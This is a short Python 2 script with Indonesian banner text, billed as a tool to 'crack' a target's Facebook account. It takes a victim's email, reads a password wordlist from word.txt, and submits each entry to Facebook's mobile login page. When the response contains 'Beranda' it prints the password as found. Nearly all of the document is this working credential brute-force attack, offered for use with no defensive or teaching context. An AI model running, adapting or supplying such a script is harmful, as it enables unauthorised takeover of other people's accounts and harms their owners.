import requests
import sys
import os

os.system("toilet HackFace --gay")
os.system("date")
print "\033[0;36mCrack Facebook Target Gan"
print "\033[0;33mJangan Di Recode Gan Kalau Mau Di Hargai_>"
print "\033[0;34m@Create By Berdasi"
print "\033[0;38mWebsite : https://berdasi17.blogspot.com/"
print "\033[0;39mhttps://www.berdasicyber.com/"
print
print "\033[0;32mExample,berdasitx@gmail.com"
print "\033[0;35mBikin Dulu WordlisNya Dengan Berformat word.txt_>"
print
email = raw_input("\033[0;38mMasukan email Target : ")

url="https://free.facebook.com/login.php"
ex = open("word.txt", "r").readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url, data={"email":email, "pass":password, "login":"sumbit"})
    content = http.content
    if "Beranda" in content:
        print "\033[0;32m[+] Password Ketemu",password
        sys.exit(1)
    else:
        print "\033[0;31m[!] password Salah",password
